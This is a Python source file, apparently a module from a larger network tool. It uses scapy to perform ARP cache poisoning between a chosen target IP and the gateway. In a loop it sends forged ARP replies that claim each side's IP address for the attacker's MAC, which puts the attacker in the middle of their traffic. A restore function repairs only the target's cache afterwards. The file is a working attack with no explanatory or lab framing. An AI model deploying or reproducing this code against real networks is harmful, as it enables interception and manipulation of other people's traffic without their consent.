
import time

from scapy.all import sendp
from scapy.arch import get_if_hwaddr
from scapy.layers.l2 import ARP, Ether, getmacbyip

from helper.network import get_proper_interface


def arp_spoof(target_ip, gateway_ip, stop_event):
    try:
        target_mac = getmacbyip(target_ip)
        if not target_mac:
            return False

        gateway_mac = getmacbyip(gateway_ip)
        if not gateway_mac:
            return False

        iface = get_proper_interface(gateway_ip)
        attacker_mac = get_if_hwaddr(iface)
        if not attacker_mac:
            return False

        while not stop_event.is_set():
            try:
                to_victim = Ether(dst=target_mac)/ARP(
                    op=2,
                    psrc=gateway_ip,
                    hwsrc=attacker_mac,
                    pdst=target_ip,
                    hwdst=target_mac
                )

                to_gateway = Ether(dst=gateway_mac)/ARP(
                    op=2,
                    psrc=target_ip,
                    hwsrc=attacker_mac,
                    pdst=gateway_ip,
                    hwdst=gateway_mac
                )

                sendp(to_victim, iface=iface, verbose=0)
                sendp(to_gateway, iface=iface, verbose=0)
                time.sleep(2)
            except Exception:
                if stop_event.is_set():
                    break
                time.sleep(1)
                continue

    except Exception:
        return False
    finally:
        try:
            restore_arp(target_ip, gateway_ip, target_mac, gateway_mac, iface)
        except Exception:
            pass
    return True


def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac, iface):
    try:
        target_pkt = Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gateway_mac
        )

        for _ in range(5):
            sendp(target_pkt, iface=iface, verbose=0)
            time.sleep(0.2)

    except Exception as e:
        print(f"lỗi restore: {e}")
